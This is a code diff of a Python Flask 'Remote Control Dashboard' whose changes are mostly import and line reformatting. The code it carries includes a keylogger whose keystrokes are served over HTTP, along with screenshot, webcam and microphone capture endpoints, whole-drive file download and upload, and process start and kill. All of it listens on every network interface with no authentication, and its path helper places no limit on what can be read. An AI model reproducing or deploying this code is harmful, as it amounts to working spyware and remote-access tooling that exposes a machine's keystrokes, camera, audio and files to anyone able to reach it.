@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 # app.py
 """
 Remote Control Dashboard – v3
@@ -26,15 +27,29 @@ python app.py
 ```
 """
 from __future__ import annotations
-import io, ctypes, subprocess, re, threading, json, os, socket, platform, requests, shutil, uuid, tempfile
+
+import ctypes
+import io
+import json
+import os
+import platform
+import re
+import shutil
+import socket
+import subprocess
+import tempfile
+import threading
+import uuid
 from datetime import datetime
 from pathlib import Path
-from typing import Dict, Any, List
+from typing import Any, Dict, List
 
-from flask import Flask, jsonify, Response, request, send_file, abort
 import psutil
+import requests
+from flask import Flask, Response, abort, jsonify, request, send_file
 from PIL import ImageGrab
 from werkzeug.utils import secure_filename
+
 try:
     from pynput import keyboard
 except ImportError:
@@ -44,7 +59,8 @@ try:
 except ImportError:
     cv2 = None
 try:
-    import sounddevice as sd, soundfile as sf
+    import sounddevice as sd
+    import soundfile as sf
 except ImportError:
     sd = sf = None
 try:
@@ -57,6 +73,7 @@ except ImportError:
     wmi = None
 try:
     from ctypes import POINTER, cast
+
     from comtypes import CLSCTX_ALL
     from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 except ImportError:
@@ -70,6 +87,7 @@ UPLOAD_DIR.mkdir(exist_ok=True)
 # Helper functions
 ###############################################################################
 
+
 def ping_time(host: str = "8.8.8.8") -> int | None:
     try:
         out = subprocess.check_output(["ping", "-n", "1", host], text=True, timeout=5)
@@ -78,8 +96,10 @@ def ping_time(host: str = "8.8.8.8") -> int | None:
     except Exception:
         return None
 
+
 def internet_up() -> bool:
     return ping_time() is not None
+
 
 def is_locked() -> bool:
     user32 = ctypes.WinDLL("user32", use_last_error=True)
@@ -91,6 +111,7 @@ def is_locked() -> bool:
     user32.CloseDesktop(hdesk)
     return not bool(res)
 
+
 def gpu_temp() -> int | None:
     if not GPUtil:
         return None
@@ -100,13 +121,17 @@ def gpu_temp() -> int | None:
     except Exception:
         return None
 
+
 def local_ips() -> Dict[str, str]:
     ips: Dict[str, str] = {}
     for iface, addrs in psutil.net_if_addrs().items():
         for a in addrs:
-            if a.family == socket.AddressFamily.AF_INET and not a.address.startswith("127."):
+            if a.family == socket.AddressFamily.AF_INET and not a.address.startswith(
+                "127."
+            ):
                 ips[iface] = a.address
     return ips
+
 
 def public_ip(timeout: float = 3.0) -> str | None:
     try:
@@ -114,10 +139,11 @@ def public_ip(timeout: float = 3.0) -> str | None:
     except Exception:
         return None
 
+
 def specs() -> Dict[str, Any]:
     out: Dict[str, Any] = {
         "cpu": platform.processor() or platform.machine(),
-        "ram_gb": round(psutil.virtual_memory().total / (1024 ** 3), 1),
+        "ram_gb": round(psutil.virtual_memory().total / (1024**3), 1),
         "os": f"{platform.system()} {platform.release()} (build {platform.version()})",
     }
     if wmi:
@@ -136,6 +162,7 @@ def specs() -> Dict[str, Any]:
             pass
     return out
 
+
 ###############################################################################
 # Keylogger
 ###############################################################################
@@ -143,6 +170,7 @@ _keybuf: List[str] = []
 _key_running = False
 _klistener = None  # type: ignore
 _lock = threading.Lock()
+
 
 def _on_press(k):
     with _lock:
@@ -164,9 +192,11 @@ def keylog_stop():
         _klistener.stop()
     _key_running = False
 
+
 ###############################################################################
 # Brightness / Volume
 ###############################################################################
+
 
 def get_brightness() -> int | None:
     if not wmi:
@@ -175,6 +205,7 @@ def get_brightness() -> int | None:
         return wmi.WMI(namespace="wmi").WmiMonitorBrightness()[0].CurrentBrightness
     except Exception:
         return None
+
 
 def set_brightness(level: int):
     if not wmi:
@@ -199,35 +230,44 @@ def set_volume(level: int):
     vol = cast(interface, POINTER(IAudioEndpointVolume))
     vol.SetMasterVolumeLevelScalar(level / 100, None)
 
+
 ###############################################################################
 # Process Manager
 ###############################################################################
 
+
 def list_processes() -> List[Dict[str, Any]]:
     procs = []
-    for p in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
+    for p in psutil.process_iter(
+        ["pid", "name", "username", "cpu_percent", "memory_percent"]
+    ):
         try:
             procs.append(p.info)
         except psutil.NoSuchProcess:
             continue
     return procs
 
+
 ###############################################################################
 # File Browser helpers
 ###############################################################################
 BASE_DIR = Path.home().drive  # allow listing entire drive
 
+
 def safe_path(rel: str) -> Path:
     p = (Path("/") / rel.lstrip("/\\")).resolve()
     return p
+
 
 ###############################################################################
 # Flask routes
 ###############################################################################
 
+
 @app.route("/")
 def root():
     return Response(INDEX_HTML, mimetype="text/html")
+
 
 @app.route("/status")
 def status():
@@ -238,7 +278,8 @@ def status():
             "used": psutil.disk_usage(p.mountpoint).used,
             "free": psutil.disk_usage(p.mountpoint).free,
         }
-        for p in psutil.disk_partitions() if p.fstype
+        for p in psutil.disk_partitions()
+        if p.fstype
     }
     return jsonify(
         internet=internet_up(),
@@ -254,6 +295,7 @@ def status():
         specs=specs(),
     )
 
+
 @app.route("/action/<cmd>", methods=["POST"])
 def power(cmd):
     table = {
@@ -268,11 +310,13 @@ def power(cmd):
     subprocess.Popen(table[cmd])
     return "", 204
 
+
 @app.route("/brightness", methods=["GET", "POST"])
 def bright():
     if request.method == "POST":
         set_brightness(int(request.json["level"]))
     return jsonify(level=get_brightness())
+
 
 @app.route("/volume", methods=["GET", "POST"])
 def vol():
@@ -280,22 +324,28 @@ def vol():
         set_volume(int(request.json["level"]))
     return jsonify(level=get_volume())
 
+
 @app.route("/screenshot")
 def screenshot():
     img = ImageGrab.grab()
-    b = io.BytesIO(); img.save(b, format="PNG"); b.seek(0)
+    b = io.BytesIO()
+    img.save(b, format="PNG")
+    b.seek(0)
     return send_file(b, mimetype="image/png")
+
 
 @app.route("/webcam")
 def webcam():
     if not cv2:
         abort(501)
     cam = cv2.VideoCapture(0)
-    ret, frame = cam.read(); cam.release()
+    ret, frame = cam.read()
+    cam.release()
     if not ret:
         abort(500)
     _, buf = cv2.imencode(".jpg", frame)
     return send_file(io.BytesIO(buf.tobytes()), mimetype="image/jpeg")
+
 
 @app.route("/mic")
 def mic():
@@ -303,9 +353,13 @@ def mic():
         abort(501)
     dur = float(request.args.get("sec", 5))
     fs = 44100
-    rec = sd.rec(int(dur*fs), samplerate=fs, channels=1); sd.wait()
-    tmp = io.BytesIO(); sf.write(tmp, rec, fs, format="WAV"); tmp.seek(0)
+    rec = sd.rec(int(dur * fs), samplerate=fs, channels=1)
+    sd.wait()
+    tmp = io.BytesIO()
+    sf.write(tmp, rec, fs, format="WAV")
+    tmp.seek(0)
     return send_file(tmp, mimetype="audio/wav")
+
 
 @app.route("/keylogger/<cmd>", methods=["POST"])
 def keylog(cmd):
@@ -317,22 +371,27 @@ def keylog(cmd):
         abort(400)
     return "", 204
 
+
 @app.route("/keylogs")
 def keylogs():
     return jsonify(_keybuf[-1000:])
+
 
 # --------------------- Process Manager ------------------------
 @app.route("/processes")
 def processes():
     return jsonify(list_processes())
 
+
 @app.route("/process/<int:pid>/kill", methods=["POST"])
 def kill_proc(pid):
     try:
-        p = psutil.Process(pid); p.terminate()
+        p = psutil.Process(pid)
+        p.terminate()
         return "", 204
     except psutil.NoSuchProcess:
         abort(404)
+
 
 @app.route("/process/start", methods=["POST"])
 def start_proc():
@@ -345,6 +404,7 @@ def start_proc():
     except Exception as e:
         return str(e), 500
 
+
 # --------------------- File Browser ---------------------------
 @app.route("/files")
 def listing():
@@ -355,13 +415,16 @@ def listing():
         return send_file(p)
     items = []
     for child in p.iterdir():
-        items.append({
-            "name": child.name,
-            "is_dir": child.is_dir(),
-            "size": child.stat().st_size,
-            "mtime": child.stat().st_mtime,
-        })
+        items.append(
+            {
+                "name": child.name,
+                "is_dir": child.is_dir(),
+                "size": child.stat().st_size,
+                "mtime": child.stat().st_mtime,
+            }
+        )
     return jsonify(path=str(p), items=items)
+
 
 @app.route("/download")
 def download():
@@ -369,6 +432,7 @@ def download():
     if not p.is_file():
         abort(404)
     return send_file(p, as_attachment=True)
+
 
 @app.route("/upload", methods=["POST"])
 def upload():
@@ -379,6 +443,7 @@ def upload():
     dest = UPLOAD_DIR / f"{uuid.uuid4()}_{fname}"
     f.save(dest)
     return jsonify(saved=str(dest))
+
 
 ###############################################################################
 # Front-end (Bootstrap + Chart.js + Minimal JS for new endpoints)
@@ -436,5 +501,5 @@ setInterval(tick,3000);setInterval(loadProcs,10000);tick();loadProcs();
 </div></body></html>
 """
 ###############################################################################
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
